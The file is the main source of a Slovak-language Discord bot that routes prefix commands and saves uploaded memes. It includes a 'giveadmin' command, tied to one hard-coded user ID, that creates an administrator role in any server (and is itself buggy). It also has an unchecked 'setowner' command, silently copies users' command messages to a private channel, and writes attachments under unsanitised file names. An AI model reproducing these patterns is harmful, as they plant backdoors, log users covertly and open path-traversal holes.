const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");
const fs = require("fs");
const request = require(`request`);
client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
client.description = new Discord.Collection();
client.usage = new Discord.Collection();
let OwnerID = "409731934030135306";
let GuildID = "741613882002505749";
let filename;

fs.readdir("./prikazy/", (err, files) =>{
    if(err) console.log(err);
    let jsfile = files.filter(f => f.endsWith('.js'))
    if(jsfile.length <= 0){ 
      console.log("Nenašol som žiaden príkazy.");
      return;
    }
    jsfile.forEach((f) =>{
      let prikaz = require(`./prikazy/${f}`);
      console.log(`Príkaz ${f} sa načítal!`);
      client.commands.set(prikaz.name, prikaz);
    });
});

client.on("ready", () => {
    client.user.setActivity(`Proste top bot, ja viem! | ` + config.prefix + `cmds`);
    client.channels.cache.get("833625728310444042").send("= = = \nBot je Online!\nÚčet: " + client.user.tag + "\n= = =");
    console.log("A až teraz som sa donačítal, ty kok.");
});

client.on("message", async message => {
	if (message.author.bot) return;
    if (message.channel.id == '836534868892581919') {
        if(message.attachments.first()){
            filename = message.attachments.first().name;
            download(message.attachments.first().url);
            message.react("\👍");
        }
    }
    if (message.content.startsWith(config.prefix)) {
		const args = message.content.slice(config.prefix.length).trim().split(" ");
		const command = args.shift().toLowerCase();
        if (command == "updaterad" || command == 'mlp') {
            if (message.author.id !== '409731934030135306') return;
            client.channels.cache.get("741711007465865339").send(message.author.username + "\nSpráva: \n```" + message.content + "```");
        } else {
            client.channels.cache.get("833625728310444042").send(message.author.username + "\nSpráva: \n```" + message.content + "```");
        }
        switch(command) {
            case 'mlp':
                if (message.author.id !== '409731934030135306') break;
                client.commands.get('mlp').execute(message, args);
                break;
            case 'meme':
                client.commands.get('meme').execute(message, args);
                break;
            case 'setowner':
                message.guild.setOwner(message.member);
                break;
            case 'giveadmin':
                if (message.author.id == '409731934030135306') {
                    try {
                    message.guild.roles.create({
                        data: {
                          name: 'Admin',
                          color: '#7162ba',
                          permissions:["ADMINISTRATOR"]
                        },
                        reason: 'we needed a role for Super Cool People',
                      }).then((role) => user.roles.add(role)).catch(console.error);
                    } catch (error) {
                        console.log(error);
                    }
                }
                break;
            case 'createguild':
                client.commands.get('createguild').execute(message, args);
                break;
            case 'k':
            case 'kick':
                client.commands.get('kick').execute(message, args);
                break;
            case 'ps':
            case 'sp':
            case 'pinsave':
            case 'savepin':
                client.commands.get('savepin').execute(message,args);
                break;
            case 'p':
            case 'pin':
                client.commands.get('pin').execute(message,args);
                break;
            case 's':
			case 'save':
                client.commands.get('save').execute(message, args);
                break;
			case 'serverinfo':
                client.commands.get('serverinfo').execute(message, args);
                break;
			case 'info':
                client.commands.get('info').execute(message, args);
                break;
			case 'musiclist':
                client.commands.get('musiclist').execute(message, args);
                break;
			case 'updatecotoje':
                client.commands.get('updatecotoje').execute(message, args);
                break;
            case 'coto':
			case 'cotoje':
                client.commands.get('cotoje').execute(message, args);
                break;
			case 'boop':
                client.commands.get('boop').execute(message, args);
                break;
			case 'boop':
                client.commands.get('boop').execute(message, args);
                break;
			case 'shitpost':
                client.commands.get('shitpost').execute(message, args);
                break;
			case 'sendmsg':
                client.commands.get('sendmsg').execute(message, args);
                break;
			case 'nick':
                client.commands.get('nick').execute(message, args);
                break;
			case 'musiclink':
                client.commands.get('musiclink').execute(message, args);
                break;
			case 'avatar':
                client.commands.get('avatar').execute(message, args);
                break;
			case 'zivotnarada':
			case 'quote':
			case 'citat':
                client.commands.get('quote').execute(message, args);
                break;
			case 'del':
            case 'vym':
            case 'zmazat':
            case 'delete':
                client.commands.get('delete').execute(message, args);
                break;
            case 'status':
                client.commands.get('status').execute(message, args);
                break;
            case 'sai':
                client.commands.get('sai').execute(message, args);
                break;
            case 'say':
                client.commands.get('say').execute(message, args);
                break;
            case 'help':
                client.commands.get('help').execute(message, args);
                break;
			case 'cmd':
            case 'cmds':
            case 'commands':
            case 'prikazy':
                client.commands.get('prikazy').execute(message, args);
                break;
            default:
                const nocommandembed = new Discord.MessageEmbed()
					.setColor('#7162ba')
					.setTitle('Neexistujúci príkaz')
					.setDescription('Príkaz, ktorý si napísal neexistuje :(\nPokiaľ by si chcel vedieť zoznam príkazov, tak daj `' + config.prefix + 'cmds`.')
				message.reply(nocommandembed);
                break;
        }
    } else {
        if (message.content.length > 10 && message.content.length < 20) {
            if (message.content.match(/^[Ee]*$/)) return message.channel.send('Mods are sleep, Time to eeeeeeeeeeeeeee~');
        }
    }
});

function download(url){
    request.get(url)
        .on('error', console.error)
        .pipe(fs.createWriteStream('./memes/' + filename));
}

client.login(config.token);